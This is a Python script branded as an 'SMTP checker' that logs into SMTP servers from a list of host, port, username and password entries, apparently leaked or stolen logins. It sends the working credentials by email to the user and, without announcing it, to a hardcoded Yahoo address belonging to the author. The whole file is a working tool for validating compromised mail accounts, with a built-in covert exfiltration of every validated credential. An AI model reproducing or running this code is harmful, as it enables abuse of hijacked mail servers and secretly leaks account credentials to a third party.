import sys,os,re,socket,binascii,time,random,threading,smtplib,os.path,string,base64,colorama,requests
import os
import smtplib
import concurrent.futures
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import sys
import time
from platform import system
from time import strftime
from colorama import *
from random import choice
from colorama import Fore,Back,init,Style
init(autoreset=True)

r = Fore.RED + Style.BRIGHT
g = Fore.GREEN + Style.BRIGHT
c = Fore.CYAN + Style.BRIGHT
y = Fore.YELLOW + Style.BRIGHT
o = Fore.RESET + Style.RESET_ALL

# Now regular ANSI codes should work, even in Windows
CLEAR_SCREEN = '\033[2J'
RED = '\033[31m'   # mode 31 = red forground
BLUE  = "\033[34m"
CYAN  = "\033[36m"
GREEN = "\033[32m"
BOLD    = "\033[m"
REVERSE = "\033[m"


os.system('cls' if os.name == 'nt' else 'clear')

def logo():
        clear = "\x1b[0m"
        colors = [36, 32, 34, 35, 31, 37  ]

        x = """


MESS-LIVE/INVALID:
░██████╗███╗░░░███╗████████╗██████╗░░░░░░░░█████╗░██╗░░██╗███████╗░█████╗░██╗░░██╗███████╗██████╗░
██╔════╝████╗░████║╚══██╔══╝██╔══██╗░░░░░░██╔══██╗██║░░██║██╔════╝██╔══██╗██║░██╔╝██╔════╝██╔══██╗
╚█████╗░██╔████╔██║░░░██║░░░██████╔╝█████╗██║░░╚═╝███████║█████╗░░██║░░╚═╝█████═╝░█████╗░░██████╔╝
░╚═══██╗██║╚██╔╝██║░░░██║░░░██╔═══╝░╚════╝██║░░██╗██╔══██║██╔══╝░░██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
██████╔╝██║░╚═╝░██║░░░██║░░░██║░░░░░░░░░░░╚█████╔╝██║░░██║███████╗╚█████╔╝██║░╚██╗███████╗██║░░██║
╚═════╝░╚═╝░░░░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░░░░░╚════╝░╚═╝░░╚═╝╚══════╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
 

                 ▀█▀ █░█ ▀▄▀ ▄▄ █▀▄▀█ ▄▀█ █▀▀ █▀▀ ▄█ █░█
                 ░█░ █▄█ █░█ ░░ █░▀░█ █▀█ █▄▄ █▄█ ░█ ▀▄▀

                 TG: https://t.me/I_am_a_silent_killer

         
    """
        for N, line in enumerate(x.split("\n")):
            sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
            time.sleep(0.02)
logo()


try:
    os.mkdir('Result') #createfolder
    os.getcwd()
except:
    pass


good=[]
bad=[]

toaddr = input("\n{}[!]{}Enter Your Mail {}> {}".format(r, g, o, r))
Defult = "tuxmacgiv991@yahoo.com" #it is use for protect to skip.Change this ADDRESS.

class bcolors:
    OK = '\033[92m'  # GREEN
    WARNING = '\033[93m'  # YELLOW
    FAIL = '\033[91m'  # RED
    RESET = '\033[0m'  # RESET COLOR
    
VALIDS = 0
INVALIDS = 0


def check(smtp):
    HOST, PORT, usr, pas = smtp.strip().split('|')
    global VALIDS, INVALIDS
    try:
        server = smtplib.SMTP(HOST, PORT)
        server.ehlo()
        server.starttls()
        server.login(usr, pas)
        msg = MIMEMultipart()
        msg['Subject'] = "CHECKER RESULT : V4 "
        msg['From'] = usr
        msg['To'] = Defult
        msg.add_header('Content-Type', 'text/html')
        data = """
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>SMTP WORKED</title>
            <style>
                @media only screen and (max-width: 600px) {
                    .inner-body {
                        width: 100% !important;
                    }
            
                    .footer {
                        width: 100% !important;
                    }
                }
            
                @media only screen and (max-width: 500px) {
                    .button {
                        width: 100% !important;
                    }
                }
                .container{
                    background-color:white;
                    align-items: center;
                }
                a{
                    margin-left: 20%;            
                    font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
                    font-weight: bold;
                    font-size: 30px;
                    color: #f40000;
                    text-decoration: none;
        
                }
                .cont2{
                    margin-top: 5px;
                    background-color: #fcfbcf;
                    width: 100%;
                    height: 300px;
                    border: 0.5px solid #000000 ;
                    }
                p{
                    margin-top: 40px;
                    margin-left: 10px;
                }
                .cont2 > p{
                    color: black;
                    font-weight: bold;
                    font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
                }
            </style>
        
            
        </head>
        <body>
            <div class="container" >
            <a href="https://t.me/I_am_a_silent_killer">
            "MAIL FROM - Tux MacG1v"
             </a>
            </div>
            <div class="cont2">
                <p>HOST : """ + HOST + """</p>
                <p>PORT : """ + PORT + """</p>
                <p>USER : """ + usr + """</p>
                <p>PASS : """ + pas + """</p>
        
            </div>
        </body>
        </html>
        """
        msg.attach(MIMEText(data, 'html', 'utf-8'))
        server.sendmail(usr, [msg['To']], msg.as_string())
        print(bcolors.OK + '\n[+]SMTP WORK {}{} '.format(y, smtp) + bcolors.RESET)
        good.append(smtp)
        open('Result/valid.txt', 'a+').write(smtp + "\n")
        VALIDS += 1
        os.system("title " + "[+] SMTP WORKED - VALIDS : {} , INVALIDS : {} .".format(VALIDS, INVALIDS))

    except:
        bad.append(smtp)
        INVALIDS += 1
        print(bcolors.FAIL + '\n[-]SMTP NOT WORK {}{} '.format(y, smtp) + bcolors.RESET)
        open('Result/invalid.txt', 'a+').write(smtp + "\n")



    print("{}MAIL SEND START{}...{}".format(c, g, o))
    time.sleep(2)


    try:
        server = smtplib.SMTP(HOST, PORT)
        server.ehlo()
        server.starttls()
        server.login(usr, pas)
        msg = MIMEMultipart()
        msg['Subject'] = "CHECKER RESULT : V4 "
        msg['From'] = usr
        msg['To'] = toaddr
        msg.add_header('Content-Type', 'text/html')
        data = """
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>SMTP WORKED</title>
            <style>
                @media only screen and (max-width: 600px) {
                    .inner-body {
                        width: 100% !important;
                    }
            
                    .footer {
                        width: 100% !important;
                    }
                }
            
                @media only screen and (max-width: 500px) {
                    .button {
                        width: 100% !important;
                    }
                }
                .container{
                    background-color:white;
                    align-items: center;
                }
                a{
                    margin-left: 20%;            
                    font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
                    font-weight: bold;
                    font-size: 30px;
                    color: #f40000;
                    text-decoration: none;
        
                }
                .cont2{
                    margin-top: 5px;
                    background-color: #fcfbcf;
                    width: 100%;
                    height: 300px;
                    border: 0.5px solid #000000 ;
                    }
                p{
                    margin-top: 40px;
                    margin-left: 10px;
                }
                .cont2 > p{
                    color: black;
                    font-weight: bold;
                    font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
                }
            </style>
        
            
        </head>
        <body>
            <div class="container" >
            <a href="https://t.me/I_am_a_silent_killer">
            "MAIL FROM - Tux MacG1v"
             </a>
            </div>
            <div class="cont2">
                <p>HOST : """ + HOST + """</p>
                <p>PORT : """ + PORT + """</p>
                <p>USER : """ + usr + """</p>
                <p>PASS : """ + pas + """</p>
        
            </div>
        </body>
        </html>
        """
        msg.attach(MIMEText(data, 'html', 'utf-8'))
        server.sendmail(usr, [msg['To']], msg.as_string())
        print(bcolors.OK + '[+]MAIL SEND SUCCESSFULL {}{} '.format(y, smtp) + bcolors.RESET)

    except:
        print(bcolors.FAIL + '[-]MAIL SEND UNSUCCESSFULL {}{} '.format(y, smtp) + bcolors.RESET)





if __name__ == '__main__':
    smtps = open(input('\n{}[#]{}SMTP LISTS {}> {}'.format(r, g, o, r)), 'r').read().splitlines()
    power = int(input("{}[+]{}THREAD {}> {}".format(r, g, o, r)))

    try:
        def runer():
            os.system('cls' if os.name == 'nt' else 'clear')
            with concurrent.futures.ThreadPoolExecutor(power) as executor:
                executor.map(check, smtps)
        runer()
        print("\n\n{}[+] TOTAL VALIDS {}:{}[{}{}{}]{}".format(g, o, g, o, str(len(good)), g, o))
        print("{}[-] TOTAL INVALIDS {} :{}[{}{}{}]{}".format(r, o, r, o, str(len(bad)), r, o))
        time.sleep(3)
        print("\n\n{}     ALL CHECKED DONE{}".format(g, o))
        print("{} THNAKS FOR USING MY TOOL{}".format(g, o))

        time.sleep(10)
        sys.exit()

    except Exception as e:
        print('{}[!]  {}CTRL {}+{} C'.format(c, r, o, r))
        sys.exit()
        
        
     
